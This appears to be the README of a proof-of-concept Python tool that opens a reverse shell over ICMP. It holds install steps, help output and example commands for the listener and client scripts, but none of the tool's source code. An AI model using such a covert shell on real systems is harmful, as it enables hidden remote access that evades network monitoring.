# My-ICMP-Reverse-Shell
POC Python implementation of Reverse Shell over ICMP.

This uses Python 3. To install the requirements:
```
pip install -r requirements.txt
```

## Listener
````
sudo python listener.py --help          
usage: l.py [-h] -d DESTINATION

options:
  -h, --help            show this help message and exit
  -d DESTINATION, --destination DESTINATION
                        Client IP address
````

Example:
````
sudo python listener.py -d 192.168.200.5
````


## Client
````
sudo python client.py --help          
usage: l.py [-h] -d DESTINATION

options:
  -h, --help            show this help message and exit
  -d DESTINATION, --destination DESTINATION
                        Client IP address
````

Example:
````
sudo python client.py -d 192.168.200.120
````